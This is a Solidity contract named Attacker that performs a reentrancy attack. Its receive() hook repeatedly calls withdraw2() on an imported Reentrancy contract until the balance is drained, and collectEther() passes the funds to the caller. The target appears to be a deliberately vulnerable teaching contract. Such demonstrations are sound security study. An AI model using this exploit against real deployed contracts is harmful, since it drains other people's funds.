// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Reentrancy} from "./Reentrancy.sol";

contract Attacker {
    error Attacker__TransactionFailed();
    
    uint256 public number;
    Reentrancy public reentrancy;

    constructor(address _reentrancy) payable {
        reentrancy = Reentrancy(_reentrancy);
    }


    function deposit() public payable {
        reentrancy.deposit{value:msg.value}();
    }

    function withdrawEther() public {
        reentrancy.withdraw2();
    }

    function collectEther() public {
        (bool s,) = msg.sender.call{value:address(this).balance}("");
        if (!s) revert Attacker__TransactionFailed();
    }

    receive() external payable {
        if (address(reentrancy).balance > 1) {
            reentrancy.withdraw2();
        }
    }
}
